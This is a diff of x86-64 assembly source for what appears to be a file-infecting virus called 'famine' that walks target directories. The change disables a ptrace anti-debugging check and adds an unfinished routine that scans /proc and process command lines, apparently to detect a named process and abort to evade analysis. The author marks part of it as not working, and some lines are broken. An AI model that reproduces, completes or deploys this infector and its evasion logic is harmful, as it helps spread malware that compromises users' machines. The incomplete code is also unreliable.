@@ -13,28 +13,114 @@ _famine:
     PUSH
     mov rbp, rsp
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
-    mov rdi, 0
-    mov rsi, 0
-    mov rdx, 1
-    mov r10, 0
-    mov rax, SYS_PTRACE
+;ANTI DEBUG
+    ; mov rdi, 0
+    ; mov rsi, 0
+    ; mov rdx, 1
+    ; mov r10, 0
+    ; mov rax, SYS_PTRACE
+    ; syscall
+    ; cmp rax, 0
+    ; jge anti_process
+    ; mov rax, qword 0x4e49474755424544
+    ; mov [rsp], rax
+    ; mov rax, 0x0a2e2e47
+    ; mov [rsp + 8], rax
+    ; mov rdi, 1
+    ; lea rsi, [rsp]
+    ; mov rdx, 13
+    ; mov rax, SYS_WRITE
+    ; syscall
+    ; jmp clean
+
+anti_process:
+; open /proc/
+    mov rax, 0x2f636f72702f     ; need to hide this LOL.
+    mov [rsp], rax
+    mov [rsp + 6], byte 0x0
+    lea rdi, [rsp]
+    mov rdx, 0
+    mov rax, SYS_OPEN
     syscall
     cmp rax, 0
-    jge target_dir
-    mov r14, 1
-    mov rax, qword 0x4e49474755424544
-    mov [rsp], rax
-    mov rax, 0x0a2e2e47
-    mov [rsp + 8], rax
-    mov rdi, 1
-    lea rsi, [rsp]
-    mov rdx, 13
-    mov rax, SYS_WRITE
+    jl clean
+    mov r14, rax
+; mmap
+    xor rdi, rdi
+    mov rsi, 0x10000            ; arbitry.
+    mov rdx, 0x3
+    mov r10, 34                 ; MAP_PRIVATE | MAP_ANON
+    mov r8, -1
+    mov r9, 0
+    mov rax, 9
     syscall
-    jmp clean
+    mov [rsp + 32], rax
+    mov [rsp + 40], word 0
+; getdents
+    mov rsi, [rsp + 32]
+    mov rdi, r14
+    mov rax, SYS_GETDENTS
+    mov rdx, 0x10000
+    syscall
+    cmp rax, 0
+    jl clean_anti_process
+; filter process
+    mov rcx, rax
+    mov rdx, [rsp + 32]
+    xor r15, r15
+    .search_pid:
+        cmp rcx, r15
+        je  clean_anti_process
+        cmp byte [rdx + LDIRENT_64.d_type], 0x4
+        jne .inc
+        cmp byte [rdx + LDIRENT_64.d_name], 0x30
+        jl .inc
+        cmp byte [rdx + LDIRENT_64.d_name], 0x39
+        jg .inc
 
+        ;;; NOT WORKING NEED TO ADD FILENAME + CMDLINE.
+        ;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+        ; mov [rsp + 5], [rdx + LDIRENT_64.d_name]
+        ; mov rax, qword 0x656e696c646d63 ; need to hide this LOL.
+        mov [rsp + 6], rax
+        ; maybe 0 at the end?>
+        lea rdi, [rsp]
+        mov rsi, 0x0
+        mov rax, SYS_OPEN
+        syscall
+        cmp rax, 0
+        jl .inc
+        mov rdi, rax
+        mov rsi, [rsp + 42]
+        mov rdx, 0x5
+        mov rax, SYS_READ
+        syscall
+        mov rcx, 5
+        mov rdi, [rsp + 42]
+        mov rax, 0x0074736574
+        mov [rsp + 48], rax
 
-;44 45 42  55 47 47  49  4e 47 2e 2e 5c 6e
+    .inc:
+        movzx rax, word [rdx + LDIRENT_64.d_reclen]
+        add r15, rax
+        add rdx, rax
+        jmp .search_pid
+
+clean_anti_process:
+    mov rdi, r14
+    mov rax, SYS_CLOSE
+    syscall
+    mov rdi, [rsp + 32]
+    mov rsi, 0x10000
+    mov rax, SYS_MUNMAP
+    syscall
+    mov rax, [rsp + 40]
+    cmp rax, 0
+    jne clean
+    ; need ro clean stack aswell.
+
+launch:
+    mov r14, 1  ; maybe need to put that at the end.
 target_dir:
     .f1:
         lea rdi, [rel hook.folder_1]
@@ -48,7 +134,7 @@ open_dir:
     mov rax, SYS_OPEN
     syscall
     cmp rax, 0                                          ; open fail
-    jle next_dir    
+    jl next_dir    
 
     mov rdi, rax
     mov rax, SYS_GETDENTS
